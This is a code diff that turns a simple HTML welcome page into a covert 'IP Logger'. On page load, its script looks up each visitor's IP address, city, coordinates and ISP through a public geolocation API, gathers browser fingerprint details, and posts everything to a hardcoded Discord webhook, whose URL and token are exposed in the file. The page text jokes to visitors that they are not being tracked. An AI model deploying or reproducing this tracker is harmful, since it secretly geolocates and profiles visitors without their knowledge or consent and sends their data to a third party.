@@ -1,45 +1,101 @@
-<!-- ============================================ -->
-<!-- FRONTEND: index.html                         -->
-<!-- No webhook URL. No secrets. Nothing exposed. -->
-<!-- ============================================ -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <title>Welcome</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Visitor Log</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background:#0a0a0a; color:#e0e0e0;
-      font-family:'Segoe UI',sans-serif;
-      display:flex; align-items:center;
-      justify-content:center; height:100vh;
+      background: #0a0a0a;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
     .card {
-      background:#111; border:1px solid #222;
-      border-radius:12px; padding:40px; text-align:center;
+      background: #111;
+      border: 1px solid #222;
+      border-radius: 12px;
+      padding: 40px;
+      text-align: center;
+      max-width: 400px;
     }
-    h1 { color:#fff; margin-bottom:8px; }
-    p  { color:#555; font-size:.9rem; }
+    h1 { font-size: 1.4rem; color: #fff; margin-bottom: 8px; }
+    p { color: #666; font-size: 0.9rem; }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Welcome</h1>
-    <p>Nothing to see here.</p>
+    <p>You're being tracked — just kidding. Or am I.</p>
   </div>
 
   <script>
-    // Only sends browser metadata — IP captured server-side
-    navigator.sendBeacon("https://YOUR-BACKEND-URL.com/log", JSON.stringify({
-      userAgent:  navigator.userAgent,
-      language:   navigator.language,
-      platform:   navigator.platform,
-      screenRes:  `${screen.width}x${screen.height}`,
-      colorDepth: `${screen.colorDepth}-bit`,
-      referrer:   document.referrer,
-      pageURL:    window.location.href
-    }));
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1515551442776363029/NMFt8_TMPOKtKTVz4KcqPpqNIihI7mqeYEClVmvscqphPRDRrIKcEiphCjx5opeuc0QS";
+
+    async function gatherAndSend() {
+      // Grab IP + geo info from public API
+      let ipData = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+      } catch (e) {
+        ipData = { error: "Failed to fetch IP data" };
+      }
+
+      const nav = window.navigator;
+      const screen = window.screen;
+
+      const payload = {
+        username: "IP Logger",
+        avatar_url: "https://i.imgur.com/4M34hi2.png",
+        embeds: [
+          {
+            title: "🌐 New Visitor Logged",
+            color: 0x00ffcc,
+            fields: [
+              { name: "🔹 IP Address",     value: ipData.ip        || "Unknown", inline: true },
+              { name: "🏙️ City",           value: ipData.city       || "Unknown", inline: true },
+              { name: "🗺️ Region",         value: ipData.region     || "Unknown", inline: true },
+              { name: "🌍 Country",        value: `${ipData.country_name || "Unknown"} ${ipData.country_code ? `(${ipData.country_code})` : ""}`, inline: true },
+              { name: "🕐 Timezone",       value: ipData.timezone   || "Unknown", inline: true },
+              { name: "📡 ISP / Org",      value: ipData.org        || "Unknown", inline: true },
+              { name: "📍 Latitude",       value: String(ipData.latitude  ?? "N/A"), inline: true },
+              { name: "📍 Longitude",      value: String(ipData.longitude ?? "N/A"), inline: true },
+              { name: "💰 Currency",       value: ipData.currency   || "Unknown", inline: true },
+              { name: "📞 Calling Code",   value: ipData.country_calling_code || "Unknown", inline: true },
+              { name: "🖥️ Screen Res",     value: `${screen.width}x${screen.height}`, inline: true },
+              { name: "🌈 Color Depth",    value: `${screen.colorDepth}-bit`, inline: true },
+              { name: "🌐 Browser Lang",   value: nav.language      || "Unknown", inline: true },
+              { name: "🖱️ Platform",       value: nav.platform      || "Unknown", inline: true },
+              { name: "📦 User Agent",     value: nav.userAgent.slice(0, 200) || "Unknown", inline: false },
+              { name: "🔗 Referrer",       value: document.referrer || "Direct", inline: false },
+              { name: "📄 Page URL",       value: window.location.href, inline: false },
+              { name: "⏱️ Timestamp",      value: new Date().toUTCString(), inline: false },
+            ],
+            footer: { text: "Visitor Logger • ipapi.co" },
+            thumbnail: {
+              url: `https://flagcdn.com/w80/${(ipData.country_code || "un").toLowerCase()}.png`
+            }
+          }
+        ]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Webhook failed:", err);
+      }
+    }
+
+    gatherAndSend();
   </script>
 </body>
 </html>
